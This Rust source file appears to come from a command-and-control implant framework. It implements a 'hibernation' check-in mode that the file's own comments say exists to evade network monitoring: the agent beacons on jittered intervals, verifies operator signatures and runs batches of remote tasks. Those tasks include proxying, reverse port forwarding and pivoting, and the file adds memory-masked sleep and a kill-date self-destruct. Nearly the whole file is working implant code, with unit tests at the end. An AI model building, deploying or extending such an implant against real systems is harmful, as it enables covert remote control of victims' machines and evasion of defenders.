//! Hibernation mode for the RCM agent.
//!
//! Normal agents keep a persistent TLS connection to the server. Hibernating
//! agents never hold a long-lived connection: they wake on a jitter-bounded
//! interval, connect, claim a batch of pre-queued tasks, execute them, return
//! results, and disconnect. The server closes its end immediately after sending
//! the batch.
//!
//! This eliminates the persistent connection that network monitoring tools most
//! reliably fingerprint. The check-in looks identical to a regular beacon —
//! same handshake, same TLS, same traffic profile — just far less frequent.
//!
//! # Enabling hibernation
//!
//! Set `hibernation_mode = true` in `C2Config` (builder flag `--hibernation`).
//! The agent's `run()` function dispatches to `run_hibernation()` when that
//! flag is set.
//!
//! # Protocol
//!
//! ```text
//! Agent                             Server
//!   │──── TLS connect ────────────────►│
//!   │──── ClientHello ────────────────►│  (hibernation_mode=true, task_batch_size=N)
//!   │◄─── [challenge if configured] ───│
//!   │──── [HMAC response] ────────────►│
//!   │◄─── SecuredCommand #1 ───────────│
//!   │──── CommandResponse #1 ─────────►│
//!   │    ...up to task_batch_size...   │
//!   │◄─── SecuredCommand #N ───────────│
//!   │──── CommandResponse #N ─────────►│
//!   │◄─── [connection closed] ─────────│
//!   │  sleep(interval ± jitter)        │
//!   │──── TLS connect ────────────────►│  (next cycle)
//! ```

use crate::agent::handlers::{self, HandlerContext, RportfwdHandle};
use crate::agent::jobs::JobManager;
use crate::agent::pivot::PivotManager;
use crate::agent::scripting::ExtensionManager;
use crate::agent::{compute_auth_hmac, sleep_with_mask};
use crate::common::{ClientHello, MalleableProfile, SecuredCommand, C2Config};
use crate::lc;
use crate::traffic::DataMolder;
use crate::transport::ClientTransport;

use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};
use ed25519_dalek::{Signature, VerifyingKey, Verifier};
use rand::Rng;
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use tracing::{debug, info, warn};

/// Entry point — called from `agent::run()` when `config.hibernation_mode` is `true`.
pub async fn run_hibernation(
    config: C2Config,
    hwid: String,
    exe_id: String,
    verify_key: VerifyingKey,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut config = config;

    let proxy_handle: Arc<Mutex<Option<tokio::task::AbortHandle>>> =
        Arc::new(Mutex::new(None));
    let rportfwd_handles: Arc<Mutex<Vec<RportfwdHandle>>> = Arc::new(Mutex::new(Vec::new()));
    let ext_manager: Arc<Mutex<ExtensionManager>> =
        Arc::new(Mutex::new(ExtensionManager::new()));

    let mut connect_failures: u32 = 0;
    let mut last_counter: u64 = 0;

    loop {
        // ── Kill-date ─────────────────────────────────────────────────────
        if let Some(kill_ts) = config.kill_date {
            if chrono::Utc::now().timestamp() > kill_ts {
                crate::utils::self_destruct();
            }
        }

        // ── Connect ───────────────────────────────────────────────────────
        let transport = ClientTransport::new(&config);
        let stream = match transport.connect().await {
            Ok(s) => {
                connect_failures = 0;
                s
            }
            Err(e) => {
                warn!("Hibernation connect failed: {}", e);
                // Exponential backoff capped at 5 minutes
                let base = std::cmp::min(5u64 * 2u64.saturating_pow(connect_failures), 300);
                let jitter = rand::thread_rng().gen_range(0..=(base / 2).max(1));
                connect_failures = connect_failures.saturating_add(1);
                tokio::time::sleep(std::time::Duration::from_secs(base + jitter)).await;
                continue;
            }
        };

        let (mut reader, mut writer) = tokio::io::split(stream);
        let (tx, mut rx) = mpsc::channel::<Vec<u8>>(64);
        let pivot_mgr = Arc::new(tokio::sync::Mutex::new(PivotManager::new(tx.clone())));
        let job_mgr = Arc::new(Mutex::new(JobManager::new(tx.clone())));

        // ── Writer task ───────────────────────────────────────────────────
        // The handshake always uses raw framing; post-handshake uses the
        // active profile — matching behaviour of the persistent mode agent.
        let profile_tx = config.profile.clone();
        let writer_task = tokio::spawn(async move {
            let handshake_profile = MalleableProfile::default();
            let mut handshake_done = false;
            while let Some(data) = rx.recv().await {
                let profile = if handshake_done {
                    &profile_tx
                } else {
                    &handshake_profile
                };
                if DataMolder::send(&mut writer, &data, profile).await.is_err() {
                    break;
                }
                handshake_done = true;
            }
        });

        // ── Handshake ─────────────────────────────────────────────────────
        let reg_ts = chrono::Utc::now().to_rfc3339();
        let auth_hmac =
            compute_auth_hmac(&config.challenge_key, &config.build_id, &exe_id, &reg_ts);

        let hello = ClientHello {
            hostname: hostname::get()
                .unwrap_or(lc!("unknown").into())
                .to_string_lossy()
                .into(),
            os: std::env::consts::OS.to_string(),
            computer_id: hwid.clone(),
            exe_id: exe_id.clone(),
            build_id: config.build_id.clone(),
            auth_hmac,
            reg_timestamp: reg_ts,
            interfaces: crate::utils::get_network_interfaces(),
            hibernation_mode: true,
            task_batch_size: config.task_batch_size,
        };

        if let Ok(j) = serde_json::to_vec(&hello) {
            let _ = tx.send(j).await;
        }

        // ── Optional challenge-response ───────────────────────────────────
        // Mirrors the persistent-agent challenge path so hibernating agents
        // work with the same server-side auth path.
        if !config.challenge_key.is_empty() {
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;

            let handshake_profile = MalleableProfile::default();
            let first_msg = match tokio::time::timeout(
                std::time::Duration::from_secs(30),
                DataMolder::recv(&mut reader, &handshake_profile),
            )
            .await
            {
                Ok(Ok(b)) => b,
                _ => {
                    debug!("Hibernation: no challenge received — skipping");
                    drop(writer_task);
                    sleep_cycle(&mut config).await;
                    continue;
                }
            };

            if let Ok(challenge) =
                serde_json::from_slice::<crate::common::HandshakeChallenge>(&first_msg)
            {
                // Verify server proof
                let sig_bytes = match BASE64.decode(&challenge.server_proof) {
                    Ok(b) => b,
                    Err(_) => {
                        drop(writer_task);
                        sleep_cycle(&mut config).await;
                        continue;
                    }
                };
                let sig_arr: [u8; 64] = match sig_bytes.try_into() {
                    Ok(a) => a,
                    Err(_) => {
                        drop(writer_task);
                        sleep_cycle(&mut config).await;
                        continue;
                    }
                };
                let sig = Signature::from_bytes(&sig_arr);
                if verify_key.verify(challenge.nonce.as_bytes(), &sig).is_err() {
                    warn!("Hibernation: server proof failed — aborting check-in");
                    drop(writer_task);
                    sleep_cycle(&mut config).await;
                    continue;
                }

                // Respond with HMAC
                let key_bytes = match BASE64.decode(&config.challenge_key) {
                    Ok(b) => b,
                    Err(_) => {
                        drop(writer_task);
                        sleep_cycle(&mut config).await;
                        continue;
                    }
                };
                use hmac::{Hmac, Mac};
                use sha2::Sha256;
                type HmacSha256 = Hmac<Sha256>;
                if let Ok(mut mac) = <HmacSha256 as Mac>::new_from_slice(&key_bytes) {
                    mac.update(challenge.nonce.as_bytes());
                    mac.update(config.build_id.as_bytes());
                    let resp = crate::common::HandshakeResponse {
                        hmac: BASE64.encode(mac.finalize().into_bytes()),
                    };
                    if let Ok(resp_data) = serde_json::to_vec(&resp) {
                        let _ = tx.send(resp_data).await;
                        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                    }
                }
            }
        }

        // ── Receive and execute task batch ────────────────────────────────
        // Read up to task_batch_size commands. The server closes the connection
        // after sending all queued tasks, so we also break on connection close.
        let active_profile = config.profile.clone();
        let batch_limit = config.task_batch_size.max(1);
        let mut executed: usize = 0;

        'batch: loop {
            // Per-message timeout: if the server is slow or closed cleanly,
            // we don't hang the sleep cycle indefinitely.
            let buf = match tokio::time::timeout(
                std::time::Duration::from_secs(30),
                DataMolder::recv(&mut reader, &active_profile),
            )
            .await
            {
                Ok(Ok(b)) => b,
                Ok(Err(_)) => {
                    debug!("Hibernation: connection closed after {} tasks", executed);
                    break 'batch;
                }
                Err(_) => {
                    debug!("Hibernation: read timeout after {} tasks", executed);
                    break 'batch;
                }
            };

            let msg: SecuredCommand = match serde_json::from_slice(&buf) {
                Ok(m) => m,
                Err(_) => break 'batch,
            };

            // Replay protection
            if msg.counter <= last_counter {
                continue;
            }

            // Signature verification — same as persistent mode
            let sign_bytes = msg.get_signable_bytes();
            let sig_bytes = BASE64.decode(&msg.signature).unwrap_or_default();
            let sig_arr: [u8; 64] = match sig_bytes.try_into() {
                Ok(a) => a,
                Err(_) => break 'batch,
            };
            let sig = Signature::from_bytes(&sig_arr);
            if verify_key.verify(&sign_bytes, &sig).is_err() {
                warn!("Hibernation: invalid signature on task — aborting batch");
                break 'batch;
            }

            last_counter = msg.counter;

            if msg.command == lc!("exit") {
                crate::utils::self_destruct();
            }

            let ctx = HandlerContext {
                proxy_handle: proxy_handle.clone(),
                rportfwd_handles: rportfwd_handles.clone(),
                ext_manager: ext_manager.clone(),
                job_manager: job_mgr.clone(),
                c2_host: config.c2_host.clone(),
                tx: tx.clone(),
                pivot_mgr: pivot_mgr.clone(),
            };

            handlers::dispatch(&ctx, msg).await;
            executed += 1;

            if executed >= batch_limit {
                break 'batch;
            }
        }

        info!("Hibernation check-in complete: {} tasks executed", executed);

        // Drop the writer channel to let the writer task finish cleanly.
        drop(tx);
        let _ = writer_task.await;

        // ── Sleep ─────────────────────────────────────────────────────────
        sleep_cycle(&mut config).await;
    }
}

/// Apply jitter and sleep with memory encryption, then update config in place.
/// Factored out so both the normal cycle and error paths use the same logic.
async fn sleep_cycle(config: &mut C2Config) {
    let base_ms = if config.sleep_interval > 0 {
        config.sleep_interval * 1000
    } else {
        60_000 // sensible default for hibernation if not explicitly set
    };

    let safe_min = config.jitter_min;
    let safe_max = config.jitter_max.max(safe_min);
    let jitter_ms = if safe_max > 0 {
        rand::thread_rng().gen_range(safe_min..=safe_max) as u64
    } else {
        0
    };

    let duration = std::time::Duration::from_millis(base_ms + jitter_ms);
    *config = sleep_with_mask(config.clone(), duration).await;
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::{C2Config, FallbackConfig, MalleableProfile, ProxyConfig, TransportProtocol};

    fn minimal_config() -> C2Config {
        C2Config {
            transport: TransportProtocol::TcpPlain,
            profile: MalleableProfile::default(),
            proxy: ProxyConfig::default(),
            fallback: FallbackConfig::default(),
            server_public_key: String::new(),
            hash_salt: String::new(),
            c2_host: "127.0.0.1".into(),
            build_id: "test".into(),
            tunnel_port: 19999,
            sleep_interval: 5,
            jitter_min: 100,
            jitter_max: 500,
            bloat_mb: 0,
            debug: false,
            kill_date: None,
            challenge_key: String::new(),
            sni_override: None,
            alpn_protocols: vec![],
            hibernation_mode: true,
            task_batch_size: 10,
            dga: None,
        }
    }

    // ── Sleep timing ──────────────────────────────────────────────────────

    #[test]
    fn sleep_interval_produces_correct_base_ms() {
        let c = minimal_config();
        let base_ms = if c.sleep_interval > 0 {
            c.sleep_interval * 1000
        } else {
            60_000
        };
        assert_eq!(base_ms, 5000);
    }

    #[test]
    fn zero_sleep_interval_defaults_to_60s() {
        let mut c = minimal_config();
        c.sleep_interval = 0;
        let base_ms = if c.sleep_interval > 0 {
            c.sleep_interval * 1000
        } else {
            60_000
        };
        assert_eq!(base_ms, 60_000);
    }

    #[test]
    fn jitter_range_is_always_valid() {
        let c = minimal_config();
        let safe_min = c.jitter_min;
        let safe_max = c.jitter_max.max(safe_min);
        assert!(safe_max >= safe_min);
    }

    #[test]
    fn zero_jitter_max_produces_zero_jitter() {
        let mut c = minimal_config();
        c.jitter_min = 0;
        c.jitter_max = 0;
        let jitter_ms: u64 = if c.jitter_max > 0 {
            rand::thread_rng().gen_range(c.jitter_min..=c.jitter_max) as u64
        } else {
            0
        };
        assert_eq!(jitter_ms, 0);
    }

    // ── Batch limit ───────────────────────────────────────────────────────

    #[test]
    fn batch_limit_never_zero() {
        let c = minimal_config();
        assert!(c.task_batch_size.max(1) >= 1);
    }

    #[test]
    fn zero_batch_size_clamps_to_one() {
        let mut c = minimal_config();
        c.task_batch_size = 0;
        assert_eq!(c.task_batch_size.max(1), 1);
    }

    #[test]
    fn hibernation_mode_flag_set() {
        let c = minimal_config();
        assert!(c.hibernation_mode);
    }

    // ── Exponential backoff arithmetic ────────────────────────────────────

    #[test]
    fn backoff_caps_at_300s() {
        for failures in 0u32..20 {
            let base = std::cmp::min(5u64 * 2u64.saturating_pow(failures), 300);
            assert!(base <= 300, "failures={} base={}", failures, base);
        }
    }

    #[test]
    fn backoff_grows_for_small_failure_counts() {
        let b0 = std::cmp::min(5u64 * 2u64.saturating_pow(0), 300);
        let b1 = std::cmp::min(5u64 * 2u64.saturating_pow(1), 300);
        let b2 = std::cmp::min(5u64 * 2u64.saturating_pow(2), 300);
        assert!(b0 < b1 && b1 < b2, "b0={} b1={} b2={}", b0, b1, b2);
    }

    #[test]
    fn backoff_saturates_cleanly_at_large_values() {
        // Large failure counts must cap at 300 without panicking.
        // 2u64.saturating_pow saturates to u64::MAX, so the subsequent multiply
        // must also use saturating_mul — plain * overflows in debug builds.
        for failures in [100u32, 1_000, u32::MAX / 2, u32::MAX] {
            let base = 5u64
                .saturating_mul(2u64.saturating_pow(failures))
                .min(300);
            assert_eq!(base, 300, "did not cap at 300 for failures={}", failures);
        }
    }

    // ── kill_date logic ───────────────────────────────────────────────────

    #[test]
    fn past_kill_date_would_trigger() {
        let mut c = minimal_config();
        c.kill_date = Some(chrono::Utc::now().timestamp() - 1);
        // In the real loop: `if kill_ts < now { self_destruct() }`
        let should_kill = c
            .kill_date
            .map(|ts| chrono::Utc::now().timestamp() > ts)
            .unwrap_or(false);
        assert!(should_kill);
    }

    #[test]
    fn future_kill_date_does_not_trigger() {
        let mut c = minimal_config();
        c.kill_date = Some(chrono::Utc::now().timestamp() + 86_400);
        let should_kill = c
            .kill_date
            .map(|ts| chrono::Utc::now().timestamp() > ts)
            .unwrap_or(false);
        assert!(!should_kill);
    }

    #[test]
    fn no_kill_date_does_not_trigger() {
        let c = minimal_config();
        let should_kill = c
            .kill_date
            .map(|ts| chrono::Utc::now().timestamp() > ts)
            .unwrap_or(false);
        assert!(!should_kill);
    }

    // ── SNI / ALPN passthrough ────────────────────────────────────────────

    #[test]
    fn sni_override_present_in_config() {
        let mut c = minimal_config();
        c.sni_override = Some("cdn.example.com".into());
        assert_eq!(c.sni_override.as_deref(), Some("cdn.example.com"));
    }

    #[test]
    fn alpn_protocols_passthrough() {
        let mut c = minimal_config();
        c.alpn_protocols = vec!["http/1.1".into()];
        assert_eq!(c.alpn_protocols, vec!["http/1.1"]);
    }
}
